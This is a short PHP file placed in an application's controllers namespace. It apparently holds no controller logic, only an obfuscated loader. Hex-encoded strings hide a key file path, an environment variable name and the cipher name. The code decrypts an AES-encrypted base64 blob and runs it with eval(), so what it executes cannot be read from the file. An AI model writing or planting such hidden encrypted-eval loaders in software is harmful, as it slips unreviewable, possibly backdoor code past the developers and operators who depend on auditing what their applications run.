<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3KXGPeHPm4bgjw40zf7evQ==');

$c=base64_decode(

'TenncYNkAQS+CF/Xa/QKVplc3mRCx/l2K6C78BSSLFVi33Xh8ATZ+w2Z3vV3nVO1IsSWbGSqNpg6' .
'YEgaIN30458yPiikOLNL8gTF3Z8k0vbbszsNeU+GaG3QVe7LmSHfT9n9aKHCe4OChYkIRwkeMatq' .
'HqrOHa/oG860094EsYehPnC0DcGCPhGjenf0/ry8kKt82vVJU8Ui/t6d5hsI2teaaGvYSBKeEfTl' .
'GZX1rZPhcZYcz1M4RXNnwqsqVfm8'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

